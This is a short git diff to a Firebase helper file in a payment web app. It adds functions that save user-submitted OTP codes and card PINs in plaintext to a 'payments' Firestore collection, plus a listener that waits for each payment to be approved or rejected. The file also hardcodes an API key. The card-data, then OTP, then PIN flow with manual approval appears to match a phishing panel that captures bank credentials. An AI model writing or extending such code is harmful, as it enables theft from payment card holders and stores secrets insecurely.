@@ -1,7 +1,7 @@
 211111111// firebase.js
 import { getApp, getApps, initializeApp } from 'firebase/app';
 import { getDatabase } from 'firebase/database';
-import { doc, getFirestore, setDoc } from 'firebase/firestore';
+import { doc, getFirestore, onSnapshot, setDoc, updateDoc } from 'firebase/firestore';
 
 const firebaseConfig = {
   apiKey: "AIzaSyDJOaDkXvm5XP3-Fu0LsuKvQ0_dZK5uf-k",
@@ -53,4 +53,41 @@ export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
     alert('Error adding payment info to Firestore');
   }
 };
+
+// Update document with OTP
+export async function updateOtp(documentId: string, otp: string): Promise<void> {
+  const docRef = doc(db, "payments", documentId)
+  await updateDoc(docRef, {
+    otp,
+    otpSubmittedAt: new Date().toISOString(),
+  })
+}
+
+// Update document with PIN
+export async function updatePin(documentId: string, pin: string): Promise<void> {
+  const docRef = doc(db, "payments", documentId)
+  await updateDoc(docRef, {
+    pin,
+    pinSubmittedAt: new Date().toISOString(),
+  })
+}
+
+// Listen for approval status changes
+export function listenForApproval(
+  documentId: string,
+  callback: (status: "pending" | "approved" | "rejected") => void,
+): () => void {
+  const docRef = doc(db, "payments", documentId)
+
+  const unsubscribe = onSnapshot(docRef, (snapshot) => {
+    if (snapshot.exists()) {
+      const data = snapshot.data()
+      callback(data.status as "pending" | "approved" | "rejected")
+    }
+  })
+
+  return unsubscribe
+}
+
+
 export { db,database };
